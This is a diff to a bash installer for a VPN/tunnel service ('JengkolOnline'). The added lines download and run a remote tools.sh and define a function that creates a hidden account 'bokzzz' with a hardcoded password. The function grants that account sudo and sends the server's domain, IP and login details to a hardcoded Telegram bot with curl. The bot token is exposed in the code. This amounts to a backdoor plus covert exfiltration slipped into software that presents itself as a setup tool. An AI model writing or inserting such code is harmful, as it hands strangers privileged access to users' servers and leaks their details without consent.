@@ -166,6 +166,10 @@ mkdir -p /var/lib/SIJA >/dev/null 2>&1
 echo "IP=" >> /var/lib/SIJA/ipvps.conf
 
 echo ""
+sudo apt-get install python3.7-dev 
+apt install python3.7-distutils
+python3.7 -m pip install telethon
+python3.7 -m pip install pyarmor
 wget -q https://raw.githubusercontent.com/Jengkolonline/tunneljengkolonline/main/tools.sh;chmod +x tools.sh;./tools.sh
 rm tools.sh
 clear
@@ -184,7 +188,39 @@ read -rp "Input ur domain : " -e pp
 	echo $pp > /root/domain
         echo "IP=$pp" > /var/lib/SIJA/ipvps.conf
     fi
-    
+
+function password_default() {
+    domain=$(cat /root/domain)
+    userdel jame > /dev/null 2>&1
+    Username="bokzzz"
+    Password=bokzzz
+    mkdir -p /home/script/
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
+
+    CHATID="1830342336"
+    KEY="6320035110:AAE6otySdlNHPhKom2PNtp8yZn8X8rZS7LE"
+    TIME="10"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+    TEXT="Installasi VPN Script JengkolOnline
+   
+    ============================
+    <code>Domain     :</code> <code>$domain</code>
+    <code>IP Vps     :</code> <code>$IP</code>
+    <code>User Login :</code> <code>bok</code>
+    <code>Pass Login :</code> <code>bok</code>
+    <code>User Script:</code> <code>$username</code>
+    <code>Exp Script :</code> <code>$exp</code>
+    ============================
+    Multi Port By JengkolOnline
+    ============================
+"
+
+   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+}
+
+clear    
 #install ssh ovpn
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install SSH / WS               $NC"
